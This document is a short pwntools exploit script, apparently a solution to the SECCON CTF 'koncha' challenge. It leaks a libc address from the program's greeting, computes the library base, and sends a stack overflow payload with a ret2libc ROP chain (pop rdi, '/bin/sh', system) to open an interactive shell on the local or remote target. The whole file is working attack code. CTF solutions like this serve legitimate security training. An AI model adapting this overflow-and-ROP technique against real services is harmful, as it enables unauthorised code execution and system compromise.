from pwn import *

sendlineafter = lambda x, y: p.sendlineafter(x, y)
sendafter = lambda x, y: p.sendafter(x, y)
sendline = lambda x: p.sendline(x)
send = lambda x: p.send(x)

filepath = './bin/chall'
e = context.binary = ELF(filepath, checksec=False)
context.terminal = 'bash'
if args.REMOTE:
    p = remote('koncha.seccon.games', 9001)
    libc = ELF('./lib/libc.so.6')
else:
    p = process(filepath)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = [0xe3b2e, 0xe3b31, 0xe3b34]

def dbg(p):
    gdb.attach(p)
    pause()

offset = 0x1f12e8
pop_rdi = 0x0019764d

sendline(b'')
p.recvuntil(b'you, ')

libc.address = u64(p.recvuntil(b'!')[:-1].ljust(8, b'\0')) - offset
print(hex(libc.address))

payload = b'A' * 0x58
payload += p64(libc.address + pop_rdi + 1)
payload += p64(libc.address + pop_rdi)
payload += p64(next(libc.search(b'/bin/sh\0')))
payload += p64(libc.symbols['system'])

sendline(payload)
p.interactive()
